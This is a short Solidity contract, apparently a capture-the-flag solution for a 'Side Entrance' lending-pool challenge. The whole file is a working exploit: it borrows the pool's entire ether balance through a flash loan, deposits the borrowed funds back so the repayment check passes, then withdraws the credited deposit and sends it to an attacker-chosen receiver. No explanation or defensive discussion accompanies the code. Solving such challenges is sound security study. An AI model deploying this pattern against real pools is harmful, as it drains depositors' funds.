// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideEntranceAttack {
    IPool pool;
    uint256 balance;
    using Address for address payable;

    constructor(IPool _pool) {
        pool = _pool;
        balance = address(pool).balance;
    }

    function execute() external payable {
        pool.deposit{value: balance}();
    }

    function attack(address payable receiver) public {
        pool.flashLoan(balance);
        pool.withdraw();
        receiver.sendValue(balance);
    }
    receive() external payable {}

}
